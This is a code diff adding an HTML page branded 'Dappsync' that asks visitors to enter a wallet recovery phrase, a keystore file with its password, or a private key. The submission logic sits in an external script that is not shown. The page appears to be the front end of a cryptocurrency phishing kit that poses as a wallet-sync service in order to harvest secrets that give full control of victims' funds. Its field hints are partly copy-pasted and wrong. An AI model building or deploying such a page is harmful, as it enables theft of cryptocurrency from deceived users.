@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../index.css">
+    <script type="text/javascript" src="../js/form-bev.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js" ></script>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
+
+    <title>Dappsync</title>
+  </head>
+  <body data-bs-spy="scroll" data-bs-target=".navbar">
+    <nav class="navbar fixed-top navbar-expand-lg navbar-light bg-white">
+        <div class="container py-2">
+          <a class="navbar-brand logo-text" href="../index.html">Dappsync</a>
+        </div>
+      </nav>
+
+     <section>
+       <div class="container">
+        <div class="row">
+          <div class="col-4">
+             <input type="button" value="phrase" onclick="phraseOpen()" class="phraseimport-btn">
+          </div>
+          <div class="col-4">
+            <input type="button" value="keystore JSON" onclick="keystoreOpen()" class="keystoreimport-btn">
+         </div>
+         <div class="col-4">
+          <input type="button" value="Private Key" onclick="privateOpen()" class="privateimport-btn">
+       </div>
+        </div>
+        <form name="" id="phrase-import">
+          <div class="row pt-5">
+            <div class="col-12">
+              <textarea name="" id="" cols="10" rows="5" placeholder="phrase"></textarea>
+            </div>
+          </div>
+          <div class="row pt-2 text-center">
+            <div class="col-12">
+              <p style="color: rgb(59, 101, 192); font-weight: bold; font-size: small;">
+                Typically 12 (sometimes 24) words separated by single spaces
+              </p>
+            </div>
+          </div>
+          <div class="row pt-2">
+            <div class="col-12">
+              <input type="submit" value="import" class="import-btn">
+            </div>
+          </div>
+        </form>
+
+        <form name="" id="keystore-import">
+          <div class="row pt-5">
+            <div class="col-12">
+              <textarea name="" id="" cols="10" rows="5" placeholder="keystore JSON" required></textarea>
+            </div>
+          </div>
+          <div class="row pt-2">
+            <div class="col-12">
+              <input type="text" placeholder="password" class="passimport">
+            </div>
+          </div>
+          <div class="row pt-2 text-center">
+            <div class="col-12">
+              <p style="color: rgb(59, 101, 192); font-weight: bold; font-size: small;">
+                Several lines of text beginning with '(...)' plus the password you used to encrypt it
+              </p>
+            </div>
+          </div> 
+          <div class="row pt-2">
+            <div class="col-12">
+              <input type="submit" value="import" class="import-btn">
+            </div>
+          </div>
+        </form>
+
+
+        <form name="" id="privatekey-import">
+          <div class="row pt-4">
+            <div class="col-12">
+              <input type="text" placeholder="private key" class="passimport">
+            </div>
+          </div>
+          <div class="row pt-2 text-center">
+            <div class="col-12">
+              <p style="color: rgb(59, 101, 192); font-weight: bold; font-size: small;">
+                Typically 12 (sometimes 24) words separated by single spaces
+              </p>
+            </div>
+          </div> 
+          <div class="row pt-2">
+            <div class="col-12">
+              <input type="submit" value="import" class="import-btn">
+            </div>
+          </div>
+        </form>
+        
+       </div>
+         
+     </section>
+
+
+
+
+      <footer>
+        <div class="container text-center">
+            <div class="row">
+                <div class="col">
+                  &copy; Dappsyc 2022. All rights reserved
+                </div>
+            </div>
+        </div>
+    </footer>
+   
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
+  </body>
+</html>
